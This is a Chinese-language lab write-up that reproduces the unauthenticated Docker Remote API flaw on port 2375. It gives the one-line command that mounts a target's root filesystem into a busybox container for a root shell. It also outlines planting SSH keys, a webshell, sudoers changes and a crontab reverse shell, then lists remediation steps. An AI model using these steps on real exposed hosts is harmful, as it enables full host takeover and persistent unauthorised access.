本文由东塔网络安全学院-10期班学员-yuan投稿。

## 漏洞描述

docker是一种开源的应用容器引擎，这个漏洞是利用docker对外开放的一个api接口，因为权限设置不当，导致可以远程命令执行。

## 测试环境

· 本地一台虚拟机，一台临时创建的阿里云服务器

· centos7

· docker-ce-18.09.9

## 漏洞复现

 **首先探测2375端口，如果开放，再构造http:localhost:2375/version请求，如果返回包带有json格式，说明存在该漏洞。**

### 1、安装docker

 **配置宿主机网卡转发**

## 若未配置，需要执行如下$ cat <<EOF > /etc/sysctl.d/docker.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables =
1net.ipv4.ip_forward=1EOF$ sysctl -p /etc/sysctl.d/docker.conf

 **Yum安装配置docker**

## 下载阿里源repo文件$ curl -o /etc/yum.repos.d/Centos-7.repo
http://mirrors.aliyun.com/repo/Centos-7.repo$ curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo$ yum
clean all && yum makecache## 安装指定版本yum install -y docker-ce-18.09.9## 配置源加速##
https://cr.console.aliyun.com/cn-hangzhou/instances/mirrorsmkdir -p
/etc/dockervi /etc/docker/daemon.json{ "registry-mirrors" : [
"https://8xpk5wnt.mirror.aliyuncs.com" ]}## 设置开机自启systemctl enable docker
systemctl daemon-reload## docker daemonps aux |grep docker## containerdps
aux|grep containerdsystemctl status containerd

### 2、开启2375端口，提供外部访问

编辑docker文件：/usr/lib/systemd/system/docker.service

vim /usr/lib/systemd/system/docker.service

修改ExecStart行为下面内容

ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock
\

![](https://image.3001.net/images/20210108/1610088549_5ff80065087cc794adb7c.png!small)

重新加载docker配置

systemctl daemon-reload # 加载docker守护线程systemctl restart docker # 重启docker

· 查看端口

![](https://image.3001.net/images/20210108/1610088555_5ff8006bbc7969494723c.png!small)

### 3、信息收集端口

![](https://image.3001.net/images/20210108/1610088561_5ff80071a41b88e0f87cc.png!small)

### 4、查看返回包

![](https://image.3001.net/images/20210108/1610088569_5ff8007907f4e0a064395.png!small)

### 5、添加、查看本地密钥

![](https://image.3001.net/images/20210108/1610088575_5ff8007fc39491d109e8f.png!small)

### 6、远程创建docker并添加密钥

 **docker -H tcp://8.135.2.198 run --rm -it -v /:/mnt busybox chroot /mnt sh**

· 简单解释一下参数的含义：

· –rm 容器停止时，自动删除该容器

· -v 挂载目录。格式为 系统目录:容器目录

· -i 指示 docker 要在容器上打开一个标准的输入接口

· -t 指示 docker 要创建一个伪 tty 终端，连接容器的标准输入接口，之后用户就可以通过终端进行输入

![](https://image.3001.net/images/20210108/1610088583_5ff80087186dde407ae91.png!small)

### 7、本地连接目标宿主机

![](https://image.3001.net/images/20210108/1610088589_5ff8008dc3e8962bdc5bd.png!small)

## 漏洞危害

通过此漏洞，可在docker命令执行，并且影响宿主机。

## 总结流程

 **引用网上的一些总结流程**

1\. Docker是以root权限运行的，这是所有姿势的前提

1\.
Docker在运行一个容器的时候可以将宿主机上的一个目录挂载到容器内的一个目录，我们可以参考redis未授权访问漏洞，将宿主机的/root/.ssh目录挂载到容器上，然后写入公钥。如果有web目录的话，最差也能上一个webshell。

1\.
有些服务器不允许root登录，可以写入其他用户的.ssh/目录下（通过查看/etc/ssh/sshd_config目录），然后修改/etc/sudoer中的文件，配置为sudo免密码，切换为root

1\. 还可以通过crontab写计划任务反弹shell

## 漏洞修复

1.关闭2375端口 （尤其是公网情况下一定要禁用此端口）

2.在防火墙上配置禁止外网访问2375端口

